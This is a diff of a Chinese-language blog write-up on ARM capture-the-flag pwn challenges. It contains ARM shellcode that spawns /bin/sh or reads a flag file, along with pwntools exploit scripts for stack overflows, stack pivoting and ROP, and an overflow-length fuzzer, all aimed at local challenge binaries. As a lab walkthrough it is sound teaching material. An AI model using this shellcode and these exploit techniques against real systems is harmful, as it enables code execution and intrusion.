class="number">0</span>)+p64(<span class="number">0x411070</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="stack-buffer-overflow-basic"><a href="#stack-buffer-overflow-basic" class="headerlink" title="stack_buffer_overflow_basic"></a>stack_buffer_overflow_basic</h3><p><img src="/images/arm/1748835253207.png" alt="1748835253207"></p>
 <p><img src="/images/arm/1748835283934.png" alt="1748835283934"></p>
 <p>栈有可执行权限,且程序会打印出栈地址,我们可以在栈上写shellcode,然后跳转到shellcode上</p>
 <h4 id="arm架构的shellcode书写"><a href="#arm架构的shellcode书写" class="headerlink" title="arm架构的shellcode书写"></a>arm架构的shellcode书写</h4><h5 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h5><p>仍然是执行execve(“&#x2F;bin&#x2F;sh”,0,0)</p>
 <p>其中arm结构的参数通过寄存器+栈传递</p>
-<table>
-<thead>
-<tr>
-<th>寄存器</th>
-<th>用途说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>r0</code>~<code>r3</code></td>
-<td>前四个参数使用这四个寄存器传递（依次排布）</td>
-</tr>
-<tr>
-<td><code>r4</code>~<code>r10</code></td>
-<td>用于保存局部变量或 callee-saved 寄存器（函数内部可用，但调用者期望其不变）</td>
-</tr>
-<tr>
-<td><code>r11</code></td>
-<td>栈底寄存器,临时变量的地址由r11+offset寻址</td>
-</tr>
-<tr>
-<td><code>r13</code></td>
-<td>栈指针（SP）</td>
-</tr>
-<tr>
-<td><code>r14</code></td>
-<td>链接寄存器（LR）</td>
-</tr>
-<tr>
-<td><code>r15</code></td>
-<td>程序计数器（PC）</td>
-</tr>
-<tr>
-<td>超过 4 个参数</td>
-<td>从第 5 个参数开始，压入栈中由 SP 引用</td>
-</tr>
-</tbody></table>
+<p>寄存器<br>用途说明</p>
+<p><code>r0</code>~&#96;r3&#96;<br>前四个参数使用这四个寄存器传递（依次排布）</p>
+<p><code>r4</code>~&#96;r10&#96;<br>用于保存局部变量或 callee-saved 寄存器（函数内部可用，但调用者期望其不变）</p>
+<p><code>r11</code><br>栈底寄存器,临时变量的地址由r11+offset寻址</p>
+<p><code>r13</code><br>栈指针（SP）</p>
+<p><code>r14</code><br>链接寄存器（LR）</p>
+<p><code>r15</code><br>程序计数器（PC）</p>
+<p>超过 4 个参数<br>从第 5 个参数开始，压入栈中由 SP 引用</p>
 <p>首先我们要把r0-r3清空,然后把r0填入&#x2F;bin&#x2F;sh的地址</p>
 <p>然后向r7填入execve的系统调用号#11,执行svc #0</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        eor r0,r0,r0</span></span><br><span class="line"><span class="string">        eor r1,r1,r1</span></span><br><span class="line"><span class="string">        eor r2,r2,r2</span></span><br><span class="line"><span class="string">        adr r0, binsh</span></span><br><span class="line"><span class="string">        mov r7,#0xb</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">binsh:</span></span><br><span class="line"><span class="string">        .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 <h5 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h5><p>常用系统调用号表</p>
-<table>
-<thead>
-<tr>
-<th>编号</th>
-<th>系统调用名</th>
-<th>参数说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0</td>
-<td><code>restart_syscall</code></td>
-<td>-</td>
-</tr>
-<tr>
-<td>1</td>
-<td><code>exit</code></td>
-<td><code>int error_code</code></td>
-</tr>
-<tr>
-<td>2</td>
-<td><code>fork</code></td>
-<td>-</td>
-</tr>
-<tr>
-<td>3</td>
-<td><code>read</code></td>
-<td><code>unsigned int fd</code>,<code>char *buf</code>,<code>size_t count</code></td>
-</tr>
-<tr>
-<td>4</td>
-<td><code>write</code></td>
-<td><code>unsigned int fd</code>,<code>const char *buf</code>,<code>size_t count</code></td>
-</tr>
-<tr>
-<td>5</td>
-<td><code>open</code></td>
-<td><code>const char *filename</code>,<code>int flags</code>,<code>umode_t mode</code></td>
-</tr>
-<tr>
-<td>6</td>
-<td><code>close</code></td>
-<td><code>unsigned int fd</code></td>
-</tr>
-<tr>
-<td>7</td>
-<td><code>waitpid</code></td>
-<td><code>pid_t pid</code>,<code>int *status</code>,<code>int options</code></td>
-</tr>
-<tr>
-<td>8</td>
-<td><code>creat</code></td>
-<td><code>const char *pathname</code>,<code>umode_t mode</code></td>
-</tr>
-<tr>
-<td>9</td>
-<td><code>link</code></td>
-<td><code>const char *oldname</code>,<code>const char *newname</code></td>
-</tr>
-<tr>
-<td>10</td>
-<td><code>unlink</code></td>
-<td><code>const char *pathname</code></td>
-</tr>
-<tr>
-<td>11</td>
-<td><code>execve</code></td>
-<td>…</td>
-</tr>
-</tbody></table>
-<p><strong>shellcode</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">open:</span></span><br><span class="line"><span class="string">        adr r0,flag</span></span><br><span class="line"><span class="string">        eor r1,r1,r1</span></span><br><span class="line"><span class="string">        eor r2,r2,r2</span></span><br><span class="line"><span class="string">        mov r7,#5</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">read:</span></span><br><span class="line"><span class="string">        adr r1,buf</span></span><br><span class="line"><span class="string">        mov r2,#0x50</span></span><br><span class="line"><span class="string">        mov r7,#3</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">write:</span></span><br><span class="line"><span class="string">        mov r0,#1</span></span><br><span class="line"><span class="string">        mov r7,#4</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">flag:</span></span><br><span class="line"><span class="string">        .ascii &quot;./flag\\0&quot;</span></span><br><span class="line"><span class="string">buf:</span></span><br><span class="line"><span class="string">        .ascii &quot;yes!&quot;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>编号<br>系统调用名<br>参数说明</p>
+<h2 id="0restart-syscall"><a href="#0restart-syscall" class="headerlink" title="0restart_syscall"></a>0<br><code>restart_syscall</code></h2><p>1<br><code>exit</code><br><code>int error_code</code></p>
+<h2 id="2fork"><a href="#2fork" class="headerlink" title="2fork"></a>2<br><code>fork</code></h2><p>3<br><code>read</code><br><code>unsigned int fd</code>,<code>char *buf</code>,<code>size_t count</code></p>
+<p>4<br><code>write</code><br><code>unsigned int fd</code>,<code>const char *buf</code>,<code>size_t count</code></p>
+<p>5<br><code>open</code><br><code>const char *filename</code>,<code>int flags</code>,<code>umode_t mode</code></p>
+<p>6<br><code>close</code><br><code>unsigned int fd</code></p>
+<p>7<br><code>waitpid</code><br><code>pid_t pid</code>,<code>int *status</code>,<code>int options</code></p>
+<p>8<br><code>creat</code><br><code>const char *pathname</code>,<code>umode_t mode</code></p>
+<p>9<br><code>link</code><br><code>const char *oldname</code>,<code>const char *newname</code></p>
+<p>10<br><code>unlink</code><br><code>const char *pathname</code></p>
+<p>11<br><code>execve</code><br>…</p>
+<p>shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">open:</span></span><br><span class="line"><span class="string">        adr r0,flag</span></span><br><span class="line"><span class="string">        eor r1,r1,r1</span></span><br><span class="line"><span class="string">        eor r2,r2,r2</span></span><br><span class="line"><span class="string">        mov r7,#5</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">read:</span></span><br><span class="line"><span class="string">        adr r1,buf</span></span><br><span class="line"><span class="string">        mov r2,#0x50</span></span><br><span class="line"><span class="string">        mov r7,#3</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">write:</span></span><br><span class="line"><span class="string">        mov r0,#1</span></span><br><span class="line"><span class="string">        mov r7,#4</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">flag:</span></span><br><span class="line"><span class="string">        .ascii &quot;./flag\\0&quot;</span></span><br><span class="line"><span class="string">buf:</span></span><br><span class="line"><span class="string">        .ascii &quot;yes!&quot;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 <h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io=process([&quot;qemu-arm&quot;,&quot;-g&quot;,&quot;2234&quot;,&quot;./pwn&quot;])</span></span><br><span class="line">io = process(<span class="string">&quot;qemu-arm -L ./ ./pwn&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Give me data to dump:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">shellcode_addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Dump again (y/n):\n&quot;</span>,<span class="string">b&quot;y&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Give me data to dump:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        eor r0,r0,r0</span></span><br><span class="line"><span class="string">        eor r1,r1,r1</span></span><br><span class="line"><span class="string">        eor r2,r2,r2</span></span><br><span class="line"><span class="string">        adr r0, binsh</span></span><br><span class="line"><span class="string">        mov r7,#0xb</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">binsh:</span></span><br><span class="line"><span class="string">        .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">shellcode=asm(&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">open:</span></span><br><span class="line"><span class="string">        adr r0,flag</span></span><br><span class="line"><span class="string">        eor r1,r1,r1</span></span><br><span class="line"><span class="string">        eor r2,r2,r2</span></span><br><span class="line"><span class="string">        mov r7,#5</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">read:</span></span><br><span class="line"><span class="string">        adr r1,buf</span></span><br><span class="line"><span class="string">        mov r2,#0x50</span></span><br><span class="line"><span class="string">        mov r7,#3</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">write:</span></span><br><span class="line"><span class="string">        mov r0,#1</span></span><br><span class="line"><span class="string">        mov r7,#4</span></span><br><span class="line"><span class="string">        svc #0</span></span><br><span class="line"><span class="string">flag:</span></span><br><span class="line"><span class="string">        .ascii &quot;./flag\\0&quot;</span></span><br><span class="line"><span class="string">buf:</span></span><br><span class="line"><span class="string">        .ascii &quot;yes!&quot;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=shellcode.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p32(<span class="number">0</span>)+p32(shellcode_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Dump again (y/n):\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -1007,13 +541,16 @@
 <p><img src="/images/arm/1748841357209.png" alt="1748841357209"></p>
 <p>system的参数是由r11+offset确定的,而我们已知bss的地址</p>
 <p>所以</p>
-<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;qemu-arm -L ./ ./pwn&quot;, shell = True)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process([&quot;qemu-arm&quot;,&quot;-g&quot;,&quot;2211&quot;,&quot;./pwn&quot;])</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss=elf.bss()+<span class="number">0x400</span>-<span class="number">8</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p32(bss+<span class="number">0x44</span>)+p32(<span class="number">0x10658</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss))</span><br><span class="line">pop=<span class="number">0x0001055c</span><span class="comment">#&#123;r0, r1, r4, r8, fp, ip, sp, pc&#125;</span></span><br><span class="line">payload=p32(bss+<span class="number">0x18</span>)+p32(<span class="number">0x105A0</span>)+p32(bss+<span class="number">0x10</span>)+p32(<span class="number">0</span>)+<span class="string">b&quot;cat flag\x00&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(bss+<span class="number">4</span>)+p32(<span class="number">0x10680</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;qemu-arm -L ./ ./pwn&quot;, shell = True)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process([&quot;qemu-arm&quot;,&quot;-g&quot;,&quot;2211&quot;,&quot;./pwn&quot;])</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss=elf.bss()+<span class="number">0x400</span>-<span class="number">8</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p32(bss+<span class="number">0x44</span>)+p32(<span class="number">0x10658</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss))</span><br><span class="line">pop=<span class="number">0x0001055c</span><span class="comment">#&#123;r0, r1, r4, r8, fp, ip, sp, pc&#125;</span></span><br><span class="line">payload=p32(bss+<span class="number">0x18</span>)+p32(<span class="number">0x105A0</span>)+p32(bss+<span class="number">0x10</span>)+p32(<span class="number">0</span>)+<span class="string">b&quot;cat flag\x00&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(bss+<span class="number">4</span>)+p32(<span class="number">0x10680</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><strong>要点</strong></p>
+<p>要点</p>
 <ul>
-<li>scanf会对\x0c进行截断,<code>\x0c</code> 被当成控制字符 <code>Form Feed</code>，类似于换页符、换行符，会被终端解释为“输入结束”</li>
-<li>arm中调用system时要保持SP指针8字节对齐</li>
-<li>所以我们要在栈迁移时注意地址的对齐和不能出现\x0c</li>
+<li><p>scanf会对\x0c进行截断,\x0c 被当成控制字符 Form Feed，类似于换页符、换行符，会被终端解释为“输入结束”</p>
+</li>
+<li><p>arm中调用system时要保持SP指针8字节对齐</p>
+</li>
+<li><p>所以我们要在栈迁移时注意地址的对齐和不能出现\x0c</p>
+</li>
 </ul>
 <h3 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h3><p><img src="/images/arm/1748843948694.png" alt="1748843948694"></p>
 <p>符号表被剔除干净了,什么都找不到</p>
@@ -1021,14 +558,14 @@
 <p><img src="/images/arm/1748844006845.png" alt="1748844006845"></p>
 <h4 id="判断溢出长度"><a href="#判断溢出长度" class="headerlink" title="判断溢出长度"></a>判断溢出长度</h4><p>根据程序的运行可以看到我们能输入一些内容,猜测是栈溢出</p>
 <p>溢出长度我们可以手动写个脚本简单fuzz一下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn  <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="keyword">global</span> i</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Input ~ if you want to quit\n&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;------Begin------\n&quot;</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.send(<span class="string">b&#x27;a&#x27;</span>*i)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    pwn()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=io.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;E.r.r.o.r.&quot;</span> <span class="keyword">in</span> n:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> is not the true lenth&quot;</span>)</span><br><span class="line">            io.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> is the true lenth!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        io.close()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn  <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="keyword">global</span> i</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Input ~ if you want to quit\n&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;------Begin------\n&quot;</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.send(<span class="string">b&#x27;a&#x27;</span>*i)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    pwn()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=io.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;E.r.r.o.r.&quot;</span> <span class="keyword">in</span> n:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> is not the true lenth&quot;</span>)</span><br><span class="line">            io.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> is the true lenth!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        io.close()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>当达到溢出长度时程序会崩溃,经过测试得到len&#x3D;0x70</p>
 <p><img src="/images/arm/1748844231015.png" alt="1748844231015"></p>
 <p>由于程序的静态编译的,我们可以在elf中找到足够的gadget调用system(“&#x2F;bin&#x2F;sh”)</p>
 <p><img src="/images/arm/1748844384129.png" alt="1748844384129"></p>
 <p>所以简单的栈溢出</p>
-<h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rdi=<span class="number">0x20904</span></span><br><span class="line">binsh=<span class="number">0x6c384</span></span><br><span class="line">system=<span class="number">0x110B4</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p32(rdi)+p32(binsh)*<span class="number">2</span>+p32(system)</span><br><span class="line">io.sendline()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rdi=<span class="number">0x20904</span></span><br><span class="line">binsh=<span class="number">0x6c384</span></span><br><span class="line">system=<span class="number">0x110B4</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p32(rdi)+p32(binsh)*<span class="number">2</span>+p32(system)</span><br><span class="line">io.sendline()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -1042,8 +579,6 @@
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/iot/" rel="tag">iot</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
-
 
     </footer>
   </div>
@@ -1055,14 +590,14 @@
         
           
           
-            <img data-src="/covers/er.jpg" data-sizes="auto" alt="CNVD-2013-11625" class="lazyload">
+            <img data-src="/covers/as.jpg" data-sizes="auto" alt="CNVD-2013-11625  DIR-815 栈溢出漏洞" class="lazyload">
           
         
         <a href="/2025/06/11/CNVD-2013-11625%20%20DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"></a>
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">
           
-            CNVD-2013-11625
+            CNVD-2013-11625  DIR-815 栈溢出漏洞
           
         </h3>
       </div>
@@ -1073,14 +608,14 @@
       
         
         
-          <img data-src="/covers/erj.jpg" data-sizes="auto" alt="LitCTF" class="lazyload">
+          <img data-src="/covers/erj.jpg" data-sizes="auto" alt="非栈上的fmt" class="lazyload">
         
       
       <a href="/2025/05/27/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84fmt/"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
         
-          LitCTF
+          非栈上的fmt
         
       </h3>
     </div>
@@ -1126,10 +661,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        74.8k
+        71.3k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        05:57
+        05:34
       </div>
     
     
@@ -1162,7 +697,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
